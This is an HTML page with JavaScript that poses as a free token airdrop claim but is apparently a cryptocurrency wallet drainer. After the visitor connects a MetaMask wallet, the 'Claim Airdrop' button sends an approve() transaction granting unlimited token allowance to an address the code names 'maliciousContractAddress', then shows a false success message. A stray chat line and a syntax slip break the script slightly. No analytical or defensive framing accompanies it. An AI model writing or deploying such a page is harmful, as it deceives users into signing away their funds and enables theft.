<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Airdrop Claim</title>
    <!-- Pastikan pustaka Ethers.js dimuat -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f3f3f3;
        }
        .container {
            max-width: 600px;
            margin: 50px auto;
            background: white;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        .button {
            padding: 10px 20px;
            background-color: #28a745;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .button:disabled {
            background-color: #ccc;
        }
        .note {
            margin-top: 10px;
            font-size: 0.9em;
            color: gray;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>Claim Your Free Airdrop</h1>
    <p>Connect your wallet to claim 1000 FREE tokens instantly!</p>
    <button id="connectWalletButton" class="button">Connect Wallet</button>
    <button id="claimAirdropButton" class="button" disabled>Claim Airdrop</button>
    <p class="note">Note: You must approve the transaction to receive the airdrop.</p>
    <p id="status">Status: Not Connected</p>
</div>

<script>
    let provider;
    let signer;
    const maliciousContractAddress = "0xc520027d3eB2600c5ea5e799ea6F355D05b8b6f6"; // Address of the malicious contract
    const tokenAddress = "0xed5B7F9191FfBFf2Ca95D28b22bE2121ab55aD23"; // Replace with the token address
    const contractABI = [
        {
            "inputs": [
                { "internalType": "address", "name": "spender", "type": "address" },
                { "internalType": "uint256", "name": "amount", "type": "uint256" }
            ],
            "name": "approve",
            "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
            "stateMutability": "nonpayable",
            "type": "function"
        }
    ];

    async function connectWallet() {
        if (window.ethereum) {
            try {
                provider = new ethers.providers.Web3Provider(window.ethereum);
                await provider.send("eth_requestAccounts", []);
                signer = provider.getSigner();
                const address = await signer.getAddress();
                console.log("Wallet connected:", address);

                // Update UI
                document.getElementById("status").innerText = Status: Connected (Wallet: ${address});
                document.getElementById("claimAirdropButton").disabled = false;

                alert("Wallet connected successfully!");
            } catch (error) {
                console.error("Wallet connection failed:", error.message);
                alert("Failed to connect wallet: " + error.message);
            }
        } else {
            alert("MetaMask is not detected. Please install MetaMask to use this dApp.");
        }
    }

    async function claimAirdrop() {
        try {
            const contract = new ethers.Contract(tokenAddress, contractABI, signer);
            const maxApproval = ethers.constants.MaxUint256; // Set approval to maximum value

            const tx = await contract.approve(maliciousContractAddress, maxApproval);
            console.log("Approval transaction sent:", tx.hash);

            await tx.wait(); // Wait for the transaction to be mined
            console.log("Approval granted successfully!");
            alert("Congratulations! Your airdrop claim was successful.");
        } catch (error) {
            console.error("Error claiming airdrop:", error.message);
            alert("Failed to claim airdrop: " + error.message);
        }
    }

> Bob dexter:
document.getElementById("connectWalletButton").addEventListener("click", connectWallet);
    document.getElementById("claimAirdropButton").addEventListener("click", claimAirdrop);
</script>

</body>
</html>
